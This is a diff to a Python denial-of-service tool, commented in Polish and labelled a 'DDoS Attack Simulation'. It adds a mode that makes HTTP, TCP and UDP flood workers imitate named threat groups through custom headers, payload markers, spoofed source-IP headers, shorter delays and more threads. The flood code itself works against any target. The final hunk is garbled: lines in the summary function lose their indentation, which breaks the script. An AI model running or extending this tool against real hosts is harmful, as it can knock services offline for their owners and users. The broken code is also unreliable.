@@ -14,6 +14,7 @@ import threading
 import time
 import queue
 import requests
+import hashlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 
@@ -81,6 +82,8 @@ def parse_arguments():
                         help='Metoda ataku')
     parser.add_argument('--log-file', type=str, help='Plik do zapisu logów')
     parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
+    parser.add_argument('--apt-group', type=str, choices=['BlackNova', 'RedShift', 'CosmicSpider', 'None'], 
+                      default='None', help='Symuluj atak konkretnej grupy APT')
 
     return parser.parse_args()
 
@@ -116,7 +119,50 @@ def get_attack_params(intensity):
     return params.get(intensity, params['medium'])
 
 
-def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
+def get_apt_specific_headers(apt_group):
+    """
+    Zwraca nagłówki charakterystyczne dla konkretnej grupy APT.
+
+    Args:
+        apt_group (str): Nazwa grupy APT
+
+    Returns:
+        dict: Słownik z nagłówkami
+    """
+    if apt_group == 'BlackNova':
+        return {
+            'User-Agent': 'BNC-Scanner/2.1',
+            'X-Attack-ID': f'BNC-{int(time.time())}-{random.randint(1000, 9999)}',
+            'X-Source-IP': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
+            'X-Attack-Type': 'HTTP-FLOOD',
+            'Connection': 'keep-alive'
+        }
+    elif apt_group == 'RedShift':
+        return {
+            'User-Agent': 'RS-Scanner/1.0',
+            'X-RedShift-Operation': f'RSB-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
+            'X-RS-Marker': hashlib.md5(str(time.time()).encode()).hexdigest()[:10],
+            'Cache-Control': 'no-store',
+            'Connection': 'close'
+        }
+    elif apt_group == 'CosmicSpider':
+        return {
+            'User-Agent': 'CS-Scanner/3.5',
+            'X-CS-Operation': 'recon-phase',
+            'X-CS-Target': f'target-{random.randint(1, 100)}',
+            'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
+            'Connection': 'keep-alive'
+        }
+    else:
+        # Domyślne, losowe nagłówki
+        return {
+            'User-Agent': random.choice(USER_AGENTS),
+            'Accept': '*/*',
+            'Connection': 'keep-alive'
+        }
+
+
+def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id, apt_group='None'):
     """
     Wykonuje atak HTTP flood.
 
@@ -126,6 +172,7 @@ def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
         delay_ms (int): Opóźnienie między żądaniami w milisekundach
         timeout (int): Timeout dla żądania
         worker_id (int): ID workera
+        apt_group (str): Nazwa grupy APT do symulacji
     """
     local_stats = {
         'requests': 0,
@@ -136,18 +183,15 @@ def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
 
     for i in range(num_requests):
         try:
-            # Wybór losowej ścieżki i User-Agent
+            # Wybór losowej ścieżki
             path = random.choice(TARGET_PATHS)
-            user_agent = random.choice(USER_AGENTS)
             url = f"http://{target_url}{path}"
 
-            headers = {
-                'User-Agent': user_agent,
-                'Accept': '*/*',
-                'Connection': 'keep-alive',
-                'X-Attack-ID': f'worker-{worker_id}-request-{i}',
-                'X-Source-IP': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}'
-            }
+            # Pobierz nagłówki specyficzne dla grupy APT
+            headers = get_apt_specific_headers(apt_group)
+            
+            # Dodaj dodatkowe nagłówki dla identyfikacji workera
+            headers['X-Worker-ID'] = f'worker-{worker_id}-request-{i}'
 
             # Wysłanie żądania
             start_time = time.time()
@@ -165,7 +209,8 @@ def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
                 'url': url,
                 'status_code': response.status_code,
                 'response_time': elapsed,
-                'bytes_sent': local_stats['bytes_sent']
+                'bytes_sent': local_stats['bytes_sent'],
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
@@ -179,13 +224,26 @@ def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
                 'request_id': i,
                 'url': url if 'url' in locals() else target_url,
                 'error': str(e),
-                'status': 'failed'
+                'status': 'failed',
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
-        # Opóźnienie między żądaniami
-        if delay_ms > 0:
-            time.sleep(delay_ms / 1000.0)
+        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
+        if apt_group == 'BlackNova':
+            # BlackNova używa bardzo małych opóźnień - bursty attack
+            actual_delay = max(1, delay_ms / 10)
+        elif apt_group == 'RedShift':
+            # RedShift stosuje regularne opóźnienia
+            actual_delay = delay_ms
+        elif apt_group == 'CosmicSpider':
+            # CosmicSpider stosuje zmienne opóźnienia
+            actual_delay = delay_ms * random.uniform(0.5, 2.0)
+        else:
+            actual_delay = delay_ms
+
+        if actual_delay > 0:
+            time.sleep(actual_delay / 1000.0)
 
     # Aktualizacja globalnych statystyk
     with stats_lock:
@@ -197,7 +255,7 @@ def http_flood_worker(target_url, num_requests, delay_ms, timeout, worker_id):
     return local_stats
 
 
-def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id):
+def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id, apt_group='None'):
     """
     Wykonuje atak TCP SYN flood.
 
@@ -207,6 +265,7 @@ def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
         num_requests (int): Liczba żądań
         delay_ms (int): Opóźnienie między żądaniami
         worker_id (int): ID workera
+        apt_group (str): Nazwa grupy APT do symulacji
     """
     local_stats = {
         'requests': 0,
@@ -244,7 +303,8 @@ def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
                 'type': 'TCP_SYN',
                 'target': f"{target_host}:{target_port}",
                 'result': 'success' if result == 0 else 'failed',
-                'response_time': elapsed
+                'response_time': elapsed,
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
@@ -257,12 +317,26 @@ def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
                 'worker_id': worker_id,
                 'request_id': i,
                 'type': 'TCP_SYN',
-                'error': str(e)
+                'error': str(e),
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
-        if delay_ms > 0:
-            time.sleep(delay_ms / 1000.0)
+        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
+        if apt_group == 'BlackNova':
+            # BlackNova używa bardzo małych opóźnień
+            actual_delay = max(1, delay_ms / 10)
+        elif apt_group == 'RedShift':
+            # RedShift stosuje regularne opóźnienia
+            actual_delay = delay_ms
+        elif apt_group == 'CosmicSpider':
+            # CosmicSpider stosuje zmienne opóźnienia
+            actual_delay = delay_ms * random.uniform(0.5, 2.0)
+        else:
+            actual_delay = delay_ms
+
+        if actual_delay > 0:
+            time.sleep(actual_delay / 1000.0)
 
     # Aktualizacja globalnych statystyk
     with stats_lock:
@@ -274,7 +348,7 @@ def tcp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
     return local_stats
 
 
-def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id):
+def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id, apt_group='None'):
     """
     Wykonuje atak UDP flood.
 
@@ -284,6 +358,7 @@ def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
         num_requests (int): Liczba żądań
         delay_ms (int): Opóźnienie między żądaniami
         worker_id (int): ID workera
+        apt_group (str): Nazwa grupy APT do symulacji
     """
     local_stats = {
         'requests': 0,
@@ -298,7 +373,26 @@ def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
         try:
             # Generowanie losowych danych
             data_size = random.randint(64, 1024)
-            data = bytes([random.randint(0, 255) for _ in range(data_size)])
+            
+            # Modyfikacja danych dla grup APT
+            if apt_group == 'BlackNova':
+                # BlackNova dodaje swój identyfikator
+                prefix = b"BNC-FLOOD-"
+                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
+                data = prefix + random_bytes
+            elif apt_group == 'RedShift':
+                # RedShift używa charakterystycznego wzorca
+                prefix = b"RSB-UDP-FLOOD-"
+                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
+                data = prefix + random_bytes
+            elif apt_group == 'CosmicSpider':
+                # CosmicSpider dodaje swój marker
+                prefix = b"CS-PAYLOAD-"
+                random_bytes = bytes([random.randint(0, 255) for _ in range(data_size - len(prefix))])
+                data = prefix + random_bytes
+            else:
+                # Standardowe losowe dane
+                data = bytes([random.randint(0, 255) for _ in range(data_size)])
 
             # Wysłanie pakietu UDP
             sock.sendto(data, (target_host, target_port))
@@ -313,7 +407,8 @@ def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
                 'request_id': i,
                 'type': 'UDP_FLOOD',
                 'target': f"{target_host}:{target_port}",
-                'bytes_sent': data_size
+                'bytes_sent': data_size,
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
@@ -326,12 +421,26 @@ def udp_flood_worker(target_host, target_port, num_requests, delay_ms, worker_id
                 'worker_id': worker_id,
                 'request_id': i,
                 'type': 'UDP_FLOOD',
-                'error': str(e)
+                'error': str(e),
+                'apt_group': apt_group if apt_group != 'None' else None
             }
             log_queue.put(log_entry)
 
-        if delay_ms > 0:
-            time.sleep(delay_ms / 1000.0)
+        # Opóźnienie między żądaniami - zmodyfikowane dla grup APT
+        if apt_group == 'BlackNova':
+            # BlackNova używa bardzo małych opóźnień
+            actual_delay = max(1, delay_ms / 5)
+        elif apt_group == 'RedShift':
+            # RedShift stosuje regularne opóźnienia
+            actual_delay = delay_ms
+        elif apt_group == 'CosmicSpider':
+            # CosmicSpider stosuje zmienne opóźnienia
+            actual_delay = delay_ms * random.uniform(0.5, 2.0)
+        else:
+            actual_delay = delay_ms
+
+        if actual_delay > 0:
+            time.sleep(actual_delay / 1000.0)
 
     sock.close()
 
@@ -356,7 +465,7 @@ def log_writer(log_file=None, verbose=False):
     file_handle = None
     if log_file:
         file_handle = open(log_file, 'w')
-        file_handle.write("timestamp,worker_id,request_id,type,target,status,response_time,bytes_sent,error\n")
+        file_handle.write("timestamp,worker_id,request_id,type,target,status,response_time,bytes_sent,error,apt_group\n")
 
     while True:
         try:
@@ -371,7 +480,7 @@ def log_writer(log_file=None, verbose=False):
             csv_line += f"{log_entry.get('target', log_entry.get('url', ''))},"
             csv_line += f"{log_entry.get('status', log_entry.get('result', 'unknown'))},"
             csv_line += f"{log_entry.get('response_time', '')},{log_entry.get('bytes_sent', '')},"
-            csv_line += f"{log_entry.get('error', '')}\n"
+            csv_line += f"{log_entry.get('error', '')},{log_entry.get('apt_group', 'None')}\n"
 
             if file_handle:
                 file_handle.write(csv_line)
@@ -389,12 +498,13 @@ def log_writer(log_file=None, verbose=False):
         file_handle.close()
 
 
-def display_progress(duration):
+def display_progress(duration, apt_group='None'):
     """
     Wyświetla pasek postępu ataku.
 
     Args:
         duration (int): Czas trwania ataku w sekundach
+        apt_group (str): Nazwa symulowanej grupy APT
     """
     start_time = time.time()
 
@@ -412,8 +522,13 @@ def display_progress(duration):
         rate = total_reqs / elapsed if elapsed > 0 else 0
         bandwidth = bytes_sent / elapsed if elapsed > 0 else 0
 
+        # Dodaj informację o grupie APT jeśli ją symulujemy
+        apt_info = ""
+        if apt_group != 'None':
+            apt_info = f" | APT Group: {apt_group}"
+
         sys.stdout.write(
-            f"\rProgress: {progress:5.1f}% | Requests: {total_reqs} | Success: {success_reqs} | Failed: {failed_reqs} | Rate: {rate:.1f} req/s | Bandwidth: {bandwidth / 1024:.1f} KB/s")
+            f"\rProgress: {progress:5.1f}% | Requests: {total_reqs} | Success: {success_reqs} | Failed: {failed_reqs} | Rate: {rate:.1f} req/s | Bandwidth: {bandwidth / 1024:.1f} KB/s{apt_info}")
         sys.stdout.flush()
 
         time.sleep(0.5)
@@ -441,6 +556,21 @@ def main():
     delay_ms = args.delay if args.delay else attack_params['delay']
     requests_per_thread = attack_params['requests_per_thread']
 
+    # Modyfikacje parametrów dla grup APT
+    if args.apt_group == 'BlackNova':
+        # BlackNova używa większej liczby wątków i mniejszych opóźnień
+        if not args.threads:
+            num_threads = int(num_threads * 1.5)  # 50% więcej wątków
+        if not args.delay:
+            delay_ms = max(1, delay_ms / 5)  # 5x krótsze opóźnienie
+    elif args.apt_group == 'RedShift':
+        # RedShift używa bardziej przewidywalnych ataków
+        requests_per_thread = int(requests_per_thread * 1.2)  # 20% więcej żądań
+    elif args.apt_group == 'CosmicSpider':
+        # CosmicSpider używa zmiennego tempa
+        if not args.threads:
+            num_threads = num_threads + random.randint(-3, 5)  # Losowa zmiana liczby wątków
+
     # Wyświetlenie informacji o ataku
     print("=== DDoS Attack Simulation ===")
     print(f"Target: {args.target}")
@@ -450,6 +580,10 @@ def main():
     print(f"Threads: {num_threads}")
     print(f"Delay: {delay_ms}ms")
     print(f"Requests per thread: {requests_per_thread}")
+    
+    if args.apt_group != 'None':
+        print(f"Simulating APT Group: {args.apt_group}")
+        
     print("==============================\n")
 
     # Inicjalizacja statystyk
@@ -466,7 +600,7 @@ def main():
     # Uruchomienie wątku wyświetlającego postęp
     progress_thread = threading.Thread(
         target=display_progress,
-        args=(args.duration,),
+        args=(args.duration, args.apt_group),
         daemon=True
     )
     progress_thread.start()
@@ -484,7 +618,8 @@ def main():
                     requests_per_thread,
                     delay_ms,
                     args.timeout,
-                    i
+                    i,
+                    args.apt_group  # Przekazujemy grupę APT
                 )
             elif args.method == 'TCP':
                 future = executor.submit(
@@ -493,7 +628,8 @@ def main():
                     target_port,
                     requests_per_thread,
                     delay_ms,
-                    i
+                    i,
+                    args.apt_group  # Przekazujemy grupę APT
                 )
             elif args.method == 'UDP':
                 future = executor.submit(
@@ -502,11 +638,25 @@ def main():
                     target_port,
                     requests_per_thread,
                     delay_ms,
-                    i
+                    i,
+                    args.apt_group  # Przekazujemy grupę APT
                 )
             elif args.method == 'MIXED':
                 # Mieszany atak - różne metody dla różnych wątków
-                attack_type = random.choice(['HTTP', 'TCP', 'UDP'])
+                if args.apt_group == 'BlackNova':
+                    # BlackNova preferuje HTTP i TCP
+                    attack_types = ['HTTP', 'HTTP', 'TCP']
+                elif args.apt_group == 'RedShift':
+                    # RedShift używa wszystkich metod z preferencją dla HTTP
+                    attack_types = ['HTTP', 'HTTP', 'TCP', 'UDP']
+                elif args.apt_group == 'CosmicSpider':
+                    # CosmicSpider używa bardziej UDP i TCP
+                    attack_types = ['HTTP', 'TCP', 'TCP', 'UDP', 'UDP']
+                else:
+                    attack_types = ['HTTP', 'TCP', 'UDP']
+                    
+                attack_type = random.choice(attack_types)
+                
                 if attack_type == 'HTTP':
                     future = executor.submit(
                         http_flood_worker,
@@ -514,7 +664,8 @@ def main():
                         requests_per_thread,
                         delay_ms,
                         args.timeout,
-                        i
+                        i,
+                        args.apt_group
                     )
                 elif attack_type == 'TCP':
                     future = executor.submit(
@@ -523,7 +674,8 @@ def main():
                         target_port,
                         requests_per_thread,
                         delay_ms,
-                        i
+                        i,
+                        args.apt_group
                     )
                 else:
                     future = executor.submit(
@@ -532,7 +684,8 @@ def main():
                         target_port,
                         requests_per_thread,
                         delay_ms,
-                        i
+                        i,
+                        args.apt_group
                     )
 
             futures.append(future)
@@ -561,11 +714,16 @@ def main():
     time.sleep(1)
 
     # Wyświetlenie podsumowania
-    display_summary()
+    display_summary(args.apt_group)
 
 
-def display_summary():
-    """Wyświetla podsumowanie ataku."""
+def display_summary(apt_group='None'):
+    """
+    Wyświetla podsumowanie ataku.
+    
+    Args:
+        apt_group (str): Nazwa symulowanej grupy APT
+    """
     duration = (attack_stats['end_time'] - attack_stats['start_time']).total_seconds()
 
     print("\n=== Attack Summary ===")
@@ -580,7 +738,21 @@ def display_summary():
     print(f"Average request rate: {attack_stats['total_requests'] / duration if duration > 0 else 0:.2f} req/s")
     print(f"Total data sent: {attack_stats['total_bytes_sent'] / 1024:.2f} KB")
     print(f"Average bandwidth: {attack_stats['total_bytes_sent'] / duration / 1024 if duration > 0 else 0:.2f} KB/s")
-    print("=====================")
+    
+if apt_group != 'None':
+        print(f"APT Group: {apt_group}")
+        
+        if apt_group == 'BlackNova':
+            print("Attack Profile: High-Rate Flooding with Minimal Delays")
+            print("Characteristic: Aggressive, Multi-Vector with Custom Headers")
+        elif apt_group == 'RedShift':
+            print("Attack Profile: Consistent Rate Attack with Regular Patterns")
+            print("Characteristic: Custom Identifiers, Coordinated Request Timing")
+        elif apt_group == 'CosmicSpider':
+            print("Attack Profile: Variable Rate with Unpredictable Patterns")
+            print("Characteristic: Signature Markers in Traffic, Complex Distribution")
+    
+print("=====================")
 
 
 if __name__ == "__main__":
